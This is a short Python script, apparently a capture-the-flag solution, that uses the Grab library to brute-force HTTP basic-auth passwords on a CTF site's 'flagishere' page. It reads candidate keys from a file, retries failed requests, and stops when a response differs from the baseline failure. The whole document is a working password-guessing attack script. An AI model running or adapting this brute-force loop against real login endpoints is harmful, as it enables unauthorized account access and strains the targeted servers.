from time import sleep
from grab import Grab
g = Grab()

g.setup(userpwd='1:2')
g.go('http://ufaschoolctf.ru/karmen/flagishere')
bad = g.response.body

f = open('keys')

i = 0
for key in f:
	key = key.strip()
	print(key)
	
	g.setup(userpwd='Script:'+key)
	for i in range(4):
		try:
			g.go('http://ufaschoolctf.ru/karmen/flagishere')
		except Exception as e:
			print(e)
			sleep((i+1)*2)
		else:
			break
	
	if bad != g.response.body:
		print('!!!:', key)
		exit()
